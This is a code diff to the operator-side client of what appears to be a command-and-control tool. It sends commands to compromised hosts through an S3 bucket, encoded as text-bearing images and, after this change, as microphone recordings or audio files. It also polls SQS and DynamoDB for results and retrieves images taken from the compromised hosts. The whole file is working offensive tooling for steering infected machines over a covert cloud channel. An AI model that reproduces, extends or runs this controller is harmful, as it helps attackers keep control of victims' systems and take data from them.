@@ -14,6 +14,8 @@ import keyring
 import getpass
 import openai
 import base64
+import speech_recognition as sr
+import wave
 
 def main(args):
     exit = False
@@ -40,23 +42,46 @@ def main(args):
     # Set the dynamo class
     dynamo = dynamoFunction()
 
-    print('\nIf you want to exit the app, type exit. If you want to use openai, type openai.')
+    # Sets the audio processing class
+    voice = audioProcessing()
+
+    print('\nIf you want to exit the app, type exit. If you want to use openai, type openai. If you want to send a voice command, type voice to use your microphone or audioFile to send a file.')
     while exit == False:
         aiResponse = 'None'
 
         cmdProcessing = commandProcesing(init.imgDir)
         # Get the command or exit or send to openai
-        print('What command do you want to send: ')
+        print('What command or action do you want to perform: ')
         command = input()
 
         if 'exit' in command.lower():
             quit()
+        # Check if the user wants to generate an image using Dalle
         elif 'openai' in command.lower() and 'None' not in init.dalleKey:
             aiResponse = 'retry'
             while 'retry' in aiResponse:
                 print('Type out the image you want with the command. The image needs to be clear and you will be shown the image before sending it to the host.')
                 prompt = input()
                 aiResponse = cmdProcessing.openAI(prompt, init.dalleKey)
+
+        # Check if the user wants to use their mic to send a command
+        elif 'voice' in command.lower():
+            print('WARNING: This function is not forensically safe')
+
+            # Capture audio
+            voice.capture()
+
+            # Set the extension and mimetype
+            cmdProcessing.mimeType = 'audio/wav'
+            cmdProcessing.extension = 'wav'
+        
+        # Process an audio file
+        elif 'audiofile' in command.lower():
+            print('WARNING: This function is not forensically safe')
+            print('What is the file path?')
+            voice.audioPath = input()
+            cmdProcessing.mimeType = 'audio/wav'
+            voice.audioDirectory()
         else:
             # Calls initFile to create the image
             cmdProcessing.createImage(command)
@@ -64,11 +89,25 @@ def main(args):
         if  ('None' not in aiResponse and 'exit' not in aiResponse) or 'openai' not in command:
             # Check if the command image needs to be saved
             if args.commImage == True:
-                cmdProcessing.writeFile(str(time.time()), 'commImages')
+                try:
+                    cmdProcessing.writeFile(str(time.time()), 'commImages')
+                except:
+                    pass
+
+            # Check if the user writes to write the recording
+            if args.voiceWrite == True:
+                try:
+                    cmdProcessing.writeAudio(directory = 'commAudio', time = str(time.time()), result = voice.result)
+                except:
+                    pass
 
             # Set the Key for the bucket and call the function
             bucket.bucketKey = 'compromised/' + bucket.bucketName + '/sendCommand/' + str(time.time()) + '.' + cmdProcessing.extension
-            bucket.postBucketCommand(cmdProcessing.imageData)
+            if 'voice' in command or 'audio' in command:
+                splitMime = cmdProcessing.mimeType.split('/')
+                bucket.postBucketCommand(voice.result.get_wav_data(), splitMime[0])
+            else:
+                bucket.postBucketCommand(cmdProcessing.imageData, cmdProcessing.mimeType[0])
 
             # Check the SQS for commands. This needs to check for latency issues with AWS
             i = 20
@@ -236,12 +275,33 @@ class initFile:
         with open(self.fileName, 'w') as outFile:
             outFile.write(json.dumps(jsonObject, indent=2))
 
+class audioProcessing:
+    def __init__(self):
+        self.result = None
+        self.audioPath = None
+
+    def capture(self):
+        # Setup the audio capture
+        r = sr.Recognizer()
+        with sr.Microphone() as source:
+            self.result = r.listen(source)
+
+    def audioDirectory(self):
+        # Get an audio file from a directory
+        r = sr.Recognizer()
+
+        with sr.AudioFile(self.audioPath) as source:
+            self.result = r.record(source)
+
 class commandProcesing:
     def __init__(self, imgDir='', imageData=None, extension='') -> None:
         self.imgDir = imgDir
+        self.audioDir = None
         self.imageData = imageData
         self.extension = extension
         self.image = None
+        self.audio = None
+        self.mimeType = None
 
     def createImage(self, command):
         isImage = False
@@ -251,10 +311,10 @@ class commandProcesing:
 
         while isImage == False:
             randomNum = random.randint(0, len(imgList)-1)
-            mimeType = mimetypes.guess_type(imgList[randomNum])
-            if 'image' in mimeType[0]:
+            self.mimeType = mimetypes.guess_type(imgList[randomNum])
+            if 'image' in self.mimeType[0]:
                 isImage = True
-                mimeSplit = mimeType[0].split('/')
+                mimeSplit = self.mimeType[0].split('/')
                 self.extension = str(mimeSplit[1])
         
         # Adds the text to the image and places that in an object variable
@@ -282,8 +342,18 @@ class commandProcesing:
         if 'commImages' in directory:
             self.image = self.image.convert('RGB')
         
-        # Write the image to the directory
-        self.image = self.image.save(directory + '/' + str(time) +'.jpg')
+            # Write the image to the directory
+            self.image = self.image.save(directory + '/' + str(time) +'.jpg')
+    
+    def writeAudio(self, **kwargs):
+        # Write the file
+        self.audioDir = kwargs.get('directory') + '/' + kwargs.get(str('time')) +'.wav'
+        with wave.open(self.audioDir, 'wb') as wf:
+            wf.setnchannels(1) 
+            wf.setsampwidth(2)  # 16-bit samples
+            wf.setframerate(44100)  # Standard sample rate
+            wf.writeframes(kwargs.get('result').get_wav_data())
+            wf.close()
     
     def openAI(self, prompt, dalleKey):
         # Get the API key for dalle
@@ -335,12 +405,13 @@ class bucketFunctions:
         for keys, values in keys.items():
             print(keys)
 
-    def postBucketCommand(self, imgData):
+    def postBucketCommand(self, imgData, mimeType):
         # Puts the image with the command into the host's S3 path
         self.s3.put_object(
             Bucket=self.seerBucket,
             Body=io.BytesIO(imgData),
-            Key=self.bucketKey
+            Key=self.bucketKey,
+            ContentType=mimeType
         )
     
     def uploadDirectory(self, directory):
@@ -483,12 +554,13 @@ class dynamoFunction():
 if __name__ == "__main__":
     # Setup the argparse
     parse = argparse.ArgumentParser()
-    parse.add_argument('-p', help='Sets the PSM level. The default is 1', type=str, default='1')
+    parse.add_argument('-p', help='Sets the PSM level. The default is 11', type=str, default='11')
     parse.add_argument('-d', help='Enables retrieving data from dynamo', action='store_true')
     parse.add_argument('-de', help='Deletes the entry within dynamodb', action='store_true')
     parse.add_argument('-l', help='Lists the hosts in the s3 bucket', action='store_true')
     parse.add_argument('-o', help='Output the images received from the compromised host', action='store_true')
     parse.add_argument('--commImage', help='Outputs the command image', action='store_true')
+    parse.add_argument('--voiceWrite', help='Outputs the recorded voice', action='store_true')
     parse.add_argument('-b', help='Sets the bucket to pull data from', type=str)
     parse.add_argument('--init', help='Initialize the config file', action='store_true')
     parse.add_argument('--reinit', help='Reinitializes the config file', action='store_true')
